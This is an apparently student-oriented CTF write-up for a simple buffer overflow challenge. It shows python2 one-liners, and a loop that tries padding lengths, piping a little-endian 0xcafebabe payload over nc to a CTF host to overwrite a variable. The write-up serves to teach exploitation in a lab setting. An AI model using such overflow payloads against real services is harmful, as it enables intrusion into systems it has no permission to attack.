Writeup - buf
=============

This was a simple buffer overflow attack. It may have been a little complicated for
the purposes of this CTF, but if you find it interesting check out COMP6841! Don't
be alarmed if you can't solve it now :)

From the source code, we are able to see that the length of the input has a maximum
length of 19 (as the last byte is a null-byte). So our input will have to be a bit
longer than that in order to overflow into the variable `iAmCool`.

We also need to overflow the buffer with the specially crafted binary string 
`0xcafebabe`. An approach that could be used to do this is by using Python 2 to 
generate our attack string. Python 3 has some weird quirks so we'll ignore it for now.

```sh
python2 -c "print 'A'*20+ '\xbe\xba\xfe\xca'" | nc pwn.ctf.unswsecurity.com 5001 # or python
python2 -c "print 'A'*21+ '\xbe\xba\xfe\xca'" | nc pwn.ctf.unswsecurity.com 5001
python2 -c "print 'A'*22+ '\xbe\xba\xfe\xca'" | nc pwn.ctf.unswsecurity.com 5001
...
```

Notice how the cafebabe is backwards? That would be due to the endianness of the system.
x86 based systems should be little endian which would mean that the least significant byte
would be first. Imagine writing 1 million as 0000001 to get the picture.

I'm not sure if these commands work on Windows, but it should be normal on Linux or MacOS.

**Sidenote: ** here's a neat trick so that you don't have to run each python command manually.

```sh
for i in {20..30}
do
python2 -c "print 'A'*$i+ '\xbe\xba\xfe\xca'" | nc pwn.ctf.unswsecurity.com 5001
done
```
